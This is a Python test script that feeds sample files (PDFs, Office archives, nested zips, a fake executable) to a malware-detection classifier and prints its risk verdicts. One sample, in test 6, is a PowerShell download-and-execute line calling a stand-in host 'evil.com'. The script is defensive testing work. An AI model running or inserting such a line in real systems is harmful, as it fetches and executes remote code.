import io
import zipfile
import json
import os
import sys

# Ensure src/ is in the python path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), 'src')))

from btech.predict import TrustLensPredictor

predictor = TrustLensPredictor()
predictor.model_path = "Models/multiformat_model.joblib"
predictor.preprocessor_path = "Models/multiformat_preprocessor.joblib"
predictor.pe_model_path = "Models/malware_model.joblib"
predictor.pe_preprocessor_path = "Models/preprocessor.joblib"
predictor.load_assets()

def create_zip(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()

def run_test(name, filename, data):
    print(f"\n--- {name} ---")
    try:
        res = predictor.predict_file(data, filename)
        print(f"Risk: {res['risk_level']} (Trust: {res['trust_score']}%)")
        print("Reasons:")
        for r in res.get("reasons", []):
            print(f"  - {r.replace(chr(10), ' | ')}")
        if res.get("short_explanation"):
            print(f"Explanation: {res['short_explanation']}")
        # Ensure we don't fail parsing nested info
        print(f"Features: {res['features']}")
    except Exception as e:
        print(f"ERROR: {e}")

# 1. Normal PDF
run_test("1. Normal PDF", "normal.pdf", b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF")

# 2. Normal DOCX (Requires [Content_Types].xml to be identified as OOXML)
docx_data = create_zip({"[Content_Types].xml": b"<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"></Types>", "word/document.xml": b"<doc></doc>"})
run_test("2. Normal DOCX", "normal.docx", docx_data)

# 3. Normal XLSX
xlsx_data = create_zip({"[Content_Types].xml": b"<Types></Types>", "xl/workbook.xml": b"<wb></wb>"})
run_test("3. Normal XLSX", "normal.xlsx", xlsx_data)

# 4. Normal PNG
run_test("4. Normal PNG", "image.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 50)

# 5. Suspicious PDF (with JS)
run_test("5. Suspicious PDF", "suspicious.pdf", b"%PDF-1.4\n/JavaScript /JS (app.alert('hi');)\n%%EOF")

# 6. Suspicious PS1
run_test("6. Suspicious PowerShell", "script.ps1", b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')\n")

# 7. Nested ZIP with Suspicious PS1
inner_zip = create_zip({"bad.ps1": b"Invoke-Expression 'evil'"})
outer_zip = create_zip({"inner.zip": inner_zip, "readme.txt": b"hello"})
run_test("7. Nested ZIP with PS1", "nested.zip", outer_zip)

# 8. PDF with .txt extension (Mismatch)
run_test("8. PDF renamed to .txt", "hidden.txt", b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF")

# 9. Corrupted ZIP
run_test("9. Corrupted ZIP", "corrupt.zip", b"PK\x03\x04" + b"random_garbage_that_is_not_a_valid_zip")

# 10. Deeply Nested Archive
z_data = b"hello"
for i in range(5):
    z_data = create_zip({f"file{i}.zip": z_data})
run_test("10. Deeply Nested Archive", "deep.zip", z_data)

# 11. Harmless fake PE-signature
run_test("11. Fake PE", "fake.exe", b"MZ_is_just_two_letters")

# 12. DOCM (with macro)
docm_data = create_zip({"[Content_Types].xml": b"<Types></Types>", "word/vbaProject.bin": b"macro"})
run_test("12. DOCM", "macro.docm", docm_data)

# 13. Unsupported format
run_test("13. Unsupported Format", "unknown.xyz", b"some binary data")
